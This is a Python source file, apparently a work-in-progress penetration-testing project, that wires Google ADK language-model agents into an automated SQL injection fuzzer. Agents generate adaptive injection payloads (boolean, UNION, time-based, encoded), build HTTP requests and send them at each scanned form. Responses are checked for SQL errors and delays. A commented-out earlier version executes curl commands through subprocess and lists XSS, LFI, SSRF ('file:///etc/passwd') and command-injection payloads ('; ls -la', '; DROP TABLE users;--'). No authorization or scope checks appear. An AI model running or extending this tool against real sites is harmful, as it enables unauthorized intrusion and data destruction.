# import dotenv
# from google.adk.agents import Agent, SequentialAgent
# from google.adk.runners import Runner
# from google.adk.sessions import InMemorySessionService
# import asyncio
# import os
# from google.genai import types
# from dotenv import load_dotenv
# load_dotenv()
# import json
# from typing import List, Dict
# import subprocess
# import shlex


# def execute(curl: List[str]) -> List[Dict]:
#     results = []

#     for curl_command in curl:
#         print(f"Executing command: {curl_command}")

#         if not curl_command or not curl_command.strip().startswith("curl"):
#             results.append({
#                 "success": False,
#                 "error": "Invalid curl command. Command must start with 'curl'.",
#                 "status_code": -1
#             })
#             continue

#         try:
#             args = shlex.split(curl_command)
#             result = subprocess.run(
#                 args,
#                 capture_output=True,
#                 text=True,
#                 timeout=30
#             )

#             if result.returncode == 0:
#                 results.append({
#                     "success": True,
#                     "output": result.stdout.strip(),
#                     "status_code": 0
#                 })
#             else:
#                 results.append({
#                     "success": False,
#                     "error": result.stderr.strip(),
#                     "status_code": result.returncode
#                 })
#         except subprocess.TimeoutExpired:
#             results.append({
#                 "success": False,
#                 "error": "Command execution timed out after 30 seconds",
#                 "status_code": -1
#             })

#         except Exception as e:
#             results.append({
#                 "success": False,
#                 "error": f"Error executing curl command: {str(e)}",
#                 "status_code": -1
#             })

#     return results
# # AI Payload Generator Agent
# payload_agent = Agent(
#     name="payload_agent",
#     model="gemini-2.5-flash",
#     description='''You are the Payload Agent. Your task is to generate potential penetration testing payloads 
#     for given web application endpoints. These endpoints include path, methods (GET, POST), and form fields.

#     For each unique path, you will return a dictionary with:
#     - The endpoint path as a key
#     - A nested dictionary as value containing:
#       - Each form field name as key
#       - A relevant attack payload as values
    
#     For example:
#     ```
#     {
#       "/login": {
#         "email": ["test@example.com", "' OR 1=1--", "<script>alert(1)</script>"],
#         "password": ["password123", "' OR '1'='1", "admin' --"]
#       },
#       "/register": {
#         "name": ["test", "<script>alert(1)</script>", "'; DROP TABLE users;--"],
#         "email": ["test@example.com", "admin@' OR 1=1--"]
#         // other fields...
#       }
#     }
#     ```

#     For each field, generate 1 payload that are relevant based on the form field types:
#     - For `email` fields: email format attacks and email-based injections
#     - For `password` fields: SQLi or encoding-based attacks
#     - For `text` fields: XSS, LFI, command injections, etc.
#     - For `hidden` fields (like _token): CSRF attacks

#     Include common attack types:
#     - SQL Injection (`' OR 1=1--`, `admin' --`)
#     - Cross-site Scripting (XSS) (`<script>alert(1)</script>`)
#     - Server-Side Request Forgery (SSRF) (`http://127.0.0.1`, `file:///etc/passwd`)
#     - Local File Inclusion (LFI) (`../../../../etc/passwd`)
#     - Command Injection (`; ls -la`, `&& whoami`)
#     '''
# )

# attack_agent = Agent(
#     name="attack_agent",
#     model="gemini-2.5-flash",
#     description='''You are the Attack Agent. Your ONLY task is to perform penetration testing attacks on web application endpoints.
#     You will receive a list of endpoints with their respective methods and form fields. 
#     For each endpoint, you will execute the attack using the payloads generated by the Payload Agent.''',
#     tools=[execute],
#     instruction="generate a list of curl commands for each endpoint using the payloads provided by the Payload Agent, and send to `execute()`function ")

# root_agent = SequentialAgent(
#     name="sequential_agent",
#     description="You are the Sequential Agent. Your task is to manage and coordinate the execution of other agents in a sequential manner. "
#                 "If the user provides a list of endpoints, you will use the Payload Agent to generate potential payloads for each endpoint."
#                 "If the user provides a list of payloads, you will use the Attack Agent to perform penetration testing attacks on the endpoints using the payloads.",
#     sub_agents=[payload_agent, attack_agent]
# )

# # Runtime configuration (lazy-initialized to avoid side-effects on import)
# APP_NAME = "fuzzing_engine"
# USER_ID = "user_123"
# SESSION_ID = "session_456"

# # Internal runtime holders
# _session_service = None
# _runner = None
# _session = None

# def _has_genai_credentials():
#     """Check for genai credentials preferring GOOGLE_API_KEY in env.

#     Returns True if we can construct a Client with provided inputs, False otherwise.
#     """
#     api_key = os.environ.get("GOOGLE_API_KEY")
#     try:
#         from google.genai import client as genai_client
#         if api_key:
#             # Try constructing the client with api_key â€” this will raise if invalid/missing
#             genai_client.Client(api_key=api_key)
#             return True
#         # Fall back to default constructor (may raise if no other config present)
#         genai_client.Client()
#         return True
#     except Exception:
#         return False


# async def init_runtime_async(app_name: str = APP_NAME, user_id: str = USER_ID, session_id: str = SESSION_ID):
#     """Async initializer: create session and runner. Safe to call multiple times.

#     Returns the Runner instance.
#     """
#     global _session_service, _runner
#     if _runner is not None:
#         return _runner

#     _session_service = InMemorySessionService()
#     session = await _session_service.create_session(
#         app_name=app_name,
#         user_id=user_id,
#         session_id=session_id
#     )
#     # persist the created session object in module state for later access
#     global _session
#     _session = session
#     print(f"Created session: {session}")

#     _runner = Runner(
#         agent=root_agent,
#         app_name=app_name,
#         session_service=_session_service
#     )
#     return _runner


# def init_runtime_sync(app_name: str = APP_NAME, user_id: str = USER_ID, session_id: str = SESSION_ID):
#     """Synchronous initializer that runs the async initializer when called from sync code."""
#     return asyncio.run(init_runtime_async(app_name=app_name, user_id=user_id, session_id=session_id))


# def run_query(query: str):
#     """Synchronous wrapper around `run_query_async`.

#     Use `run_query_async` if you are already inside an asyncio event loop.
#     """
#     return asyncio.run(run_query_async(query))


# def save_session_to_file(path: str) -> dict:
#     """Save the currently-initialized session to a JSON file.

#     Returns a dict with keys: success (bool), path (str) and message or error.
#     """
#     if _session is None:
#         return {"success": False, "error": "No session initialized yet. Call run_query or init_runtime first."}

#     # Build a serializable representation using common attributes.
#     session_data = {}
#     for attr in ("id", "session_id", "app_name", "user_id", "state", "events", "last_update_time"):
#         # Some session implementations may use different attribute names
#         val = getattr(_session, attr, None)
#         # also try without trailing underscore for id/session_id mismatch
#         if val is None and attr == "session_id":
#             val = getattr(_session, "id", None)
#         session_data[attr] = val

#     try:
#         with open(path, "w") as f:
#             json.dump(session_data, f, default=str, indent=2)
#         return {"success": True, "path": path, "message": "Session saved."}
#     except Exception as e:
#         return {"success": False, "error": str(e)}

# async def run_query_async(query: str):
#     """Async entrypoint that awaits the runner's async API.

#     Returns the final response text or an error message when credentials are missing.
#     """
#     if not _has_genai_credentials():
#         return (
#             "LLM client not configured.\n"
#             "Set the Google AI API key or Google Cloud (vertexai, project & location) "
#             "configuration before calling the agent. For example:\n"
#             "export GOOGLE_API_KEY=your_api_key_here\n"
#         )

#     runner = await init_runtime_async()

#     content = types.Content(role="user", parts=[types.Part(text=query)])
#     async for event in runner.run_async(user_id=USER_ID, session_id=SESSION_ID, new_message=content):
#         if event.is_final_response():
#             print(_session)
#             return event.content.parts[0].text
#     return "No response received."

# if __name__ == "__main__":
#     # Example of usage when executed as a script
#     resp = run_query('''{
#     "endpoints": [
#         {
#             "url": "https://example.com/login",
#             "method": "POST",
#             "parameters": {
#                 "email": "user@example.com",
#                 "password": "password123"
#             }
#         }
#     ]}''')
#     print(resp)
#     save_session_to_file("fuzzing_session.json")

# agent.py
# Google ADK â€“ SQL Injection LoopAgent (Full Working Example)

import asyncio
from typing import Dict, Any
from google.adk.agents import LoopAgent, LlmAgent, SequentialAgent
from google.adk.runners import InMemoryRunner
from google.adk.tools.tool_context import ToolContext
from google.adk.events import Event, EventActions
from google.adk.sessions import InMemorySessionService
from google.adk.runners import Runner
import subprocess
import shlex
import time
from typing import List, Dict
from google.adk.tools.tool_context import ToolContext
from dotenv import load_dotenv
load_dotenv()
from google.genai import types
import time
from typing import Dict, Any
from google.adk.tools.tool_context import ToolContext
import requests
import time
import json
import re
import os

def parse_json_from_state(value):
    """Parse JSON from state value, stripping markdown code blocks if present."""
    if value is None:
        return None
    
    # If it's already a dict, return it
    if isinstance(value, dict):
        return value
    
    # If it's a string, try to parse it
    if isinstance(value, str):
        # Remove markdown code blocks (```json ... ``` or ``` ... ```)
        cleaned = re.sub(r'^```(?:json)?\s*\n?', '', value, flags=re.MULTILINE)
        cleaned = re.sub(r'\n?```\s*$', '', cleaned, flags=re.MULTILINE)
        cleaned = cleaned.strip()
        
        try:
            return json.loads(cleaned)
        except json.JSONDecodeError:
            # If parsing fails, try the original string
            try:
                return json.loads(value)
            except json.JSONDecodeError:
                return value
    
    return value

def execute_attack(request_args: dict) -> dict:
    endpoint = request_args["endpoint"]
    method = request_args["method"]
    data = request_args["data"]
    print(f"Endpoint: {endpoint}")
    print(f"Method: {method}")
    print(f"Data: {data}")
    start = time.time()

    if method.upper() == "POST":
        resp = requests.post(endpoint, data=data, timeout=15, allow_redirects=False)
    else:
        resp = requests.get(endpoint, params=data, timeout=15, allow_redirects=False)
    print(f"Status Code: {resp.status_code}")
    print(f"Length: {len(resp.text)}")
    latency = round(time.time() - start, 3)
    body = resp.text.lower()

    sql_error = any(k in body for k in [
        "sql syntax", "mysql", "sqlite", "psql", "ora-", "syntax error"
    ])

    return {
        "status": resp.status_code,
        "length": len(resp.text),
        "latency": latency,
        "sql_error": sql_error
    }



def execute(request: dict, tool_context: ToolContext) -> dict:
    endpoint = request["endpoint"]
    method = request["method"]
    data = request["data"]

    print("ðŸ”¥ http_request TOOL INVOKED ðŸ”¥")
    print("Endpoint:", endpoint)
    print("Method:", method)
    print("Data:", data)

    try:
        start = time.time()

        if method.upper() == "POST":
            resp = requests.post(
                endpoint,
                data=data,
                timeout=15,
                allow_redirects=False
            )
        else:
            resp = requests.get(
                endpoint,
                params=data,
                timeout=15,
                allow_redirects=False
            )

        latency = time.time() - start
        body = resp.text.lower()

        sql_error_keywords = [
            "sql syntax",
            "mysql",
            "sqlite",
            "psql",
            "ora-",
            "syntax error",
            "odbc",
            "jdbc"
        ]

        sql_error = any(k in body for k in sql_error_keywords)

        return {
            "status": resp.status_code,
            "length": len(resp.text),
            "latency": round(latency, 3),
            "sql_error": sql_error
        }

    except Exception as e:
        return {
            "status": -1,
            "length": 0,
            "latency": 0,
            "sql_error": False,
            "error": str(e)
        }

# def execute(curl_commands: List[str], tool_context: ToolContext) -> List[Dict]:
#     """
#     ADK Tool: Executes curl commands safely and returns structured results.
#     """

#     results = []

#     for curl_command in curl_commands:
#         print(f"[execute] Running: {curl_command}")

#         # Basic validation
#         if not curl_command or not curl_command.strip().startswith("curl"):
#             results.append({
#                 "success": False,
#                 "error": "Invalid curl command",
#                 "status_code": -1,
#                 "latency": 0,
#                 "response_length": 0,
#                 "stdout": "",
#                 "stderr": "",
#                 "sql_error": False,
#                 "timed_out": False
#             })
#             continue

#         try:
#             args = shlex.split(curl_command)

#             start = time.time()
#             completed = subprocess.run(
#                 args,
#                 capture_output=True,
#                 text=True,
#                 timeout=30
#             )
#             latency = time.time() - start

#             stdout = completed.stdout or ""
#             stderr = completed.stderr or ""
#             combined = (stdout + stderr).lower()

#             # SQL error heuristics
#             sql_error_keywords = [
#                 "sql syntax",
#                 "mysql",
#                 "psql",
#                 "sqlite",
#                 "ora-",
#                 "syntax error",
#                 "unterminated",
#                 "odbc",
#                 "jdbc"
#             ]

#             sql_error = any(k in combined for k in sql_error_keywords)

#             results.append({
#                 "success": completed.returncode == 0,
#                 "status_code": completed.returncode,
#                 "latency": round(latency, 3),
#                 "response_length": len(stdout),
#                 "stdout": stdout[:2000],   # cap for safety
#                 "stderr": stderr[:2000],
#                 "sql_error": sql_error,
#                 "timed_out": False
#             })

#         except subprocess.TimeoutExpired:
#             results.append({
#                 "success": False,
#                 "status_code": -1,
#                 "latency": 30,
#                 "response_length": 0,
#                 "stdout": "",
#                 "stderr": "Command timed out",
#                 "sql_error": False,
#                 "timed_out": True
#             })

#         except Exception as e:
#             results.append({
#                 "success": False,
#                 "status_code": -1,
#                 "latency": 0,
#                 "response_length": 0,
#                 "stdout": "",
#                 "stderr": str(e),
#                 "sql_error": False,
#                 "timed_out": False
#             })

#     return results


# -------------------------------------------------------------------
# Constants
# -------------------------------------------------------------------

APP_NAME = "agents"
USER_ID = "dev_user_01"
SESSION_ID = "agents"
GEMINI_MODEL = "gemma-3-1b-it"

# -------------------------------------------------------------------
# State Keys
# -------------------------------------------------------------------

STATE_ENDPOINT = "endpoint"
STATE_FIELD = "field"
STATE_PAYLOAD = "payload"
STATE_FEEDBACK = "feedback"

# -------------------------------------------------------------------
# Exit Tool
# -------------------------------------------------------------------

def exit_loop(tool_context: ToolContext):
    """
    Call ONLY when SQL injection is confirmed
    or further attempts are useless.
    """
    print(f"[Tool Call] exit_loop triggered by {tool_context.agent_name}")
    tool_context.actions.escalate = True
    tool_context.actions.skip_summarization = True
    return {}

# -------------------------------------------------------------------
# SQL Payload Generator Agent
# -------------------------------------------------------------------
# state_init_agent = LlmAgent(
#     name="StateInitAgent",
#     model=GEMINI_MODEL,
#     include_contents="none",
#     instruction="""
# Initialize loop state from Web input.

# Return EXACTLY this JSON:
# {
#   "endpoint": "{{input.endpoint}}",
#   "field": "{{input.field}}"
# }
# """,
#     output_key="__state__",   # ðŸ‘ˆ THIS IS THE KEY
#     description="Writes endpoint and field into ADK state"
# )
# endpoint_init_agent = LlmAgent(
#     name="EndpointInitAgent",
#     model=GEMINI_MODEL,
#     include_contents="none",
#     instruction="""
# Read endpoint from Web input and output it verbatim.

# Endpoint: {{input.endpoint}}

# Output ONLY the endpoint string.
# """,
#     output_key="endpoint"
# )
# field_init_agent = LlmAgent(
#     name="FieldInitAgent",
#     model=GEMINI_MODEL,
#     include_contents="none",
#     instruction="""
# Read field from Web input and output it verbatim.

# Field: {{input.field}}

# Output ONLY the field string.
# """,
#     output_key="field"
# )
# feedback_init_agent = LlmAgent(
#     name="FeedbackInitAgent",
#     model=GEMINI_MODEL,
#     include_contents="none",
#     instruction="""
# Initialize feedback state.

# Output an empty JSON object.
# """,
#     output_key="feedback"
# )

form_init_agent = LlmAgent(
    name="FormInitAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    instruction="""
You are initializing form context for an attack agent.

The user message contains a JSON string with form information.
Parse the JSON from the user's message and output EXACTLY this JSON structure:

{
  "endpoint": "<value from 'action' field or 'endpoint' field>",
  "method": "<value from 'method' field>",
  "inputs": <value from 'inputs' field as array>,
  "target_field": "<value from 'target_field' field>"
}

Rules:
- If the input JSON has "action", use it as "endpoint"
- If the input JSON has "endpoint", use it directly
- Copy "method", "inputs", and "target_field" directly
- Output ONLY the raw JSON, NO markdown code blocks, NO ```json, NO explanations
- Just output the JSON object directly, nothing else
""",
    output_key="form"
)


sql_payload_agent = LlmAgent(
    name="SQLPayloadAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    instruction="""
You are a SQL Injection Payload Generator that adapts based on feedback.

Form context:
Endpoint: {{form.endpoint}}
Method: {{form.method}}
Inputs: {{form.inputs}}
Target field to attack: {{form.target_field}}

Previous attempt feedback (if available):
{{feedback}}

Previous payload used (if available):
{{payload}}

Task:
Generate ONE NEW SQL injection payload that is DIFFERENT from previous attempts.

Strategy based on feedback:
- If status 419 (CSRF token missing) â†’ Try different payload encoding or structure
- If status 200 but no SQL error â†’ Try error-based or time-based payloads
- If previous payload was simple boolean â†’ Try UNION-based or stacked queries
- If previous payload was basic â†’ Try encoded, obfuscated, or alternative syntax

Payload types to rotate through:
1. Boolean-based: ' OR '1'='1, ' OR 1=1--, admin'--
2. Error-based: ', ", ;, ), etc. to trigger SQL errors
3. UNION-based: ' UNION SELECT NULL--, ' UNION SELECT 1,2,3--
4. Time-based: '; WAITFOR DELAY '00:00:05'--, ' OR SLEEP(5)--
5. Encoded: %27 OR %271%27=%271, %27%20OR%20%271%27=%271
6. Alternative syntax: ' OR 'x'='x, ' OR 1=1#, ' OR 'a'='a

CRITICAL RULES:
- Generate a DIFFERENT payload than what was used before (check {{payload}})
- If feedback shows 419 error, the payload might need encoding or different approach
- Output ONLY the raw payload string, NO markdown, NO code blocks, NO backticks, NO explanations
- Just the payload text, nothing else
""",
    output_key="payload"
)


# sql_payload_agent = LlmAgent(
#     name="SQLPayloadAgent",
#     model=GEMINI_MODEL,
#     include_contents="none",
#     instruction="""
# You are a SQL Injection Payload Generator.

# Context:
# - Target endpoint: {{endpoint}}
# - Target parameter: {{field}}
# - Previous execution feedback:
# {{feedback}}

# Task:
# Generate ONE SQL injection payload.

# Rules:
# - Start simple, escalate gradually.
# - Prefer boolean-based â†’ error-based â†’ time-based.
# - Output ONLY the payload string.
# - No explanations.
# """,
#     description="Generates SQL injection payloads adaptively.",
#     output_key=STATE_PAYLOAD
# )

# -------------------------------------------------------------------
# SQL Attack Execution Agent
# -------------------------------------------------------------------

# sql_attack_agent = LlmAgent(
#     name="SQLAttackAgent",
#     model=GEMINI_MODEL,
#     include_contents="none",
#     tools=[execute],
#     instruction="""
# You are a SQL Attack Execution Agent.

# You are given:
# - Endpoint: {{endpoint}}
# - Parameter: {{field}}
# - Payload: {{payload}}

# Task:
# 1. Execute the attack using curl using the execute tool.
# 2. Return the results of the execution using the execute tool.
# """,
#     description="Executes SQL payloads using the execute tool and returns structured feedback.",
#     output_key=STATE_FEEDBACK
# )
request_builder_agent = LlmAgent(
    name="RequestBuilderAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    instruction="""
You are building a concrete HTTP request from state.

Form data:
- Endpoint: {{form.endpoint}}
- Method: {{form.method}}
- Target field: {{form.target_field}}
- All inputs: {{form.inputs}}

Payload to inject: {{payload}}

Task:
Build a JSON object with the actual values from the form and payload.


Rules:
- Use the ACTUAL endpoint value from {{form.endpoint}}
- Use the ACTUAL method value from {{form.method}}
- Inject the ACTUAL payload value from {{payload}} into the field specified by {{form.target_field}}
- Use dummy values (like "test") for other non-hidden fields
- Output ONLY the raw JSON object, NO markdown, NO code blocks, NO ```json, NO backticks, NO explanations
- Start with { and end with }, nothing before or after
""",
    output_key="request"
)

sql_attack_agent = LlmAgent(
    name="SQLAttackAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    tools=[execute],
    instruction="""
Call the execute(request) tool using the request object in state.

request:
{{request}}

Rules:
- Call the execute(request) tool with EXACTLY this argument:
{
  "request": <the object above>
}
- Do not generate text
- Do not modify values
""",
    output_key="feedback"
)


# -------------------------------------------------------------------
# SQL Evaluator + Exit Controller Agent
# -------------------------------------------------------------------

# sql_evaluator_agent = LlmAgent(
#     name="SQLEvaluatorAgent",
#     model=GEMINI_MODEL,
#     include_contents="none",
#     tools=[exit_loop],
#     instruction="""
# You are a SQL Injection Evaluator.

# Execution feedback:
# {{feedback}}

# Decision rules:
# - IF sql_error == true â†’ call exit_loop
# - IF latency >= 4.5 seconds â†’ call exit_loop
# - IF HTTP status is 403 or 429 â†’ call exit_loop
# - ELSE â†’ do nothing (continue loop)

# IMPORTANT:
# - If calling exit_loop, DO NOT output text.
# - If continuing, output NOTHING.
# """,
#     description="Evaluates SQL attack results and decides when to exit."
# )

sql_evaluator_agent = LlmAgent(
    name="SQLEvaluatorAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    tools=[exit_loop],
    instruction="""
Execution feedback:
{{feedback}}

If sql_error == true OR latency >= 4.5:
call exit_loop

Else do nothing.
"""
)


# -------------------------------------------------------------------
# SQL Injection Loop Agent
# -------------------------------------------------------------------

# sql_loop_agent = LoopAgent(
#     name="SQLInjectionLoop",
#     sub_agents=[
#         sql_payload_agent,
#         request_builder_agent,
#         # sql_attack_agent,
#         sql_evaluator_agent
#     ],
#     max_iterations=2
# )

# -------------------------------------------------------------------
# Root Sequential Agent (required name: root_agent)
# -------------------------------------------------------------------

# root_agent = SequentialAgent(
#     name="SQLInjectionPipeline",
#     description="SQL injection testing pipeline (ADK Web compatible)",
#     sub_agents=[
#         state_init_agent,   
#         sql_loop_agent
#     ]
# )
# root_agent = SequentialAgent(
#     name="SQLInjectionPipeline",
#     sub_agents=[
#         endpoint_init_agent,   # writes state.endpoint
#         field_init_agent,      # writes state.field
#         feedback_init_agent,   # writes state.feedback
#         sql_loop_agent         # safe to run now
#     ]
# )
root_agent = SequentialAgent(
    name="SQLInjectionPipeline",
    sub_agents=[
        sql_payload_agent,      # payload agent reads {{form.*}} from state
        request_builder_agent,
    ]
)
# -------------------------------------------------------------------
# Runner
# -------------------------------------------------------------------

from google.genai import types

async def run():
    import logging
    from datetime import datetime
    
    # Setup logging to file and console
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = os.path.join(log_dir, f"fuzzing_engine_{timestamp}.log")
    
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()
        ]
    )
    logger = logging.getLogger(__name__)
    
    logger.info("="*60)
    logger.info("Starting SQL Injection Testing Workflow")
    logger.info("="*60)
    
    # Load structure.json
    # Get the path relative to this file
    current_dir = os.path.dirname(os.path.abspath(__file__))
    project_root = os.path.dirname(os.path.dirname(current_dir))  # Go up 2 levels to project root
    structure_file = os.path.join(project_root, "scan_results", "structure.json")
    
    try:
        with open(structure_file, 'r') as f:
            structure_data = json.load(f)
        forms = structure_data.get("forms", [])
        logger.info(f"Loaded {len(forms)} forms from structure.json")
        logger.info(f"Structure file path: {structure_file}")
    except Exception as e:
        logger.error(f"Failed to load structure.json: {e}")
        return
    
    session_service = InMemorySessionService()
    
    # Process each form
    for form_idx, form in enumerate(forms, 1):
        logger.info(f"\n{'='*60}")
        logger.info(f"Processing Form {form_idx}/{len(forms)}")
        logger.info(f"Endpoint: {form.get('action')}")
        logger.info(f"Method: {form.get('method')}")
        logger.info(f"{'='*60}")
        
        # Determine target field (first required email/text field)
        target_field = None
        for inp in form.get("inputs", []):
            if inp.get("type") in ["email", "text"] and inp.get("required"):
                target_field = inp.get("name")
                break
        
        if not target_field:
            # Fallback to first non-hidden input
            for inp in form.get("inputs", []):
                if inp.get("type") != "hidden":
                    target_field = inp.get("name")
                    break
        
        if not target_field:
            logger.warning(f"Form {form_idx}: No suitable target field found. Skipping.")
            continue
        
        logger.info(f"Target field: {target_field}")
        
        # Create a unique session for each form
        form_session_id = f"{SESSION_ID}_form_{form_idx}"
        try:
            session = await session_service.create_session(
                app_name=APP_NAME,
                user_id=USER_ID,
                session_id=form_session_id
            )
            logger.info(f"Created session: {form_session_id}")
        except Exception as e:
            logger.error(f"Failed to create session for form {form_idx}: {e}")
            continue
        
        runner = Runner(
            agent=root_agent,
            app_name=APP_NAME,
            session_service=session_service
        )
        
        # Set form data directly in state
        form_data = {
            "endpoint": form.get("action", ""),
            "method": form.get("method", "GET"),
            "inputs": form.get("inputs", []),
            "target_field": target_field
        }
        
        # Update state with form data using Event/EventActions
        form_state_changes = {
            "form": form_data,
            "feedback": "",
            "payload": ""
        }
        
        form_actions = EventActions(state_delta=form_state_changes)
        form_event = Event(
            author="system",
            actions=form_actions
        )
        
        await session_service.append_event(session, form_event)
        logger.info(f"State initialized for form {form_idx}")
        
        # Create evaluator runner
        runner2 = Runner(
            agent=sql_evaluator_agent,
            app_name=APP_NAME,
            session_service=session_service
        )
        
        # Loop for 3 iterations per form
        max_iterations = 3
        for iteration in range(1, max_iterations + 1):
            logger.info(f"\n[Form {form_idx}] Iteration {iteration}/{max_iterations}")
            logger.info(f"{'='*60}")
            
            # ---------- Phase 1: planning ----------
            logger.info(f"[Form {form_idx}] Phase 1: Generating payload and building request...")
            try:
                async for _ in runner.run_async(
                    user_id=USER_ID,
                    session_id=form_session_id,
                    new_message=types.Content(
                        role="user",
                        parts=[types.Part(text=f"Start SQL injection testing - Iteration {iteration}")]
                    )
                ):
                    pass
            except Exception as e:
                logger.error(f"[Form {form_idx}] Phase 1 error: {e}")
                continue
            
            # Get the session again to access updated state
            try:
                session = await session_service.get_session(
                    app_name=APP_NAME,
                    user_id=USER_ID,
                    session_id=form_session_id
                )
                logger.info(f"[Form {form_idx}] State after agent run: {session.state}")
            except Exception as e:
                logger.error(f"[Form {form_idx}] Failed to get session: {e}")
                continue
            
            # ---------- Phase 2: Python execution ----------
            logger.info(f"[Form {form_idx}] Phase 2: Executing attack...")
            state = session.state
            request_raw = state.get("request")
            
            request_args = parse_json_from_state(request_raw)
            logger.info(f"[Form {form_idx}] Request args (parsed): {request_args}")
            
            if not request_args:
                logger.warning(f"[Form {form_idx}] Request not found in state. Skipping iteration.")
                continue
            
            if not isinstance(request_args, dict):
                logger.warning(f"[Form {form_idx}] Request args must be a dict, got {type(request_args)}. Skipping iteration.")
                continue
            
            try:
                feedback = execute_attack(request_args)
                logger.info(f"[Form {form_idx}] Feedback: {feedback}")
            except Exception as e:
                logger.error(f"[Form {form_idx}] Attack execution error: {e}")
                continue
            
            # Get the session to update state
            try:
                session = await session_service.get_session(
                    app_name=APP_NAME,
                    user_id=USER_ID,
                    session_id=form_session_id
                )
            except Exception as e:
                logger.error(f"[Form {form_idx}] Failed to get session for state update: {e}")
                continue
            
            # Update state with feedback
            state_changes = {
                "feedback": feedback,
                "iteration": iteration
            }
            
            actions_with_update = EventActions(state_delta=state_changes)
            system_event = Event(
                author="system",
                actions=actions_with_update
            )
            
            await session_service.append_event(session, system_event)
            logger.info(f"[Form {form_idx}] State after adding feedback: {session.state}")
            
            # ---------- Phase 3: evaluation ----------
            logger.info(f"[Form {form_idx}] Phase 3: Evaluating results...")
            try:
                async for event in runner2.run_async(
                    user_id=USER_ID,
                    session_id=form_session_id,
                    new_message=types.Content(
                        role="user",
                        parts=[
                            types.Part(text=str({
                                "feedback": feedback,
                                "iteration": iteration
                            }))
                        ]
                    )
                ):
                    pass
            except Exception as e:
                logger.error(f"[Form {form_idx}] Phase 3 error: {e}")
            
            logger.info(f"[Form {form_idx}] Iteration {iteration} completed")
        
        logger.info(f"\n{'='*60}")
        logger.info(f"Form {form_idx} Testing Completed")
        logger.info(f"{'='*60}\n")
    
    logger.info(f"\n{'='*60}")
    logger.info(f"âœ… Completed testing all {len(forms)} forms")
    logger.info(f"Logs saved to: {log_file}")
    logger.info(f"{'='*60}\n")


if __name__ == "__main__":
    asyncio.run(run())
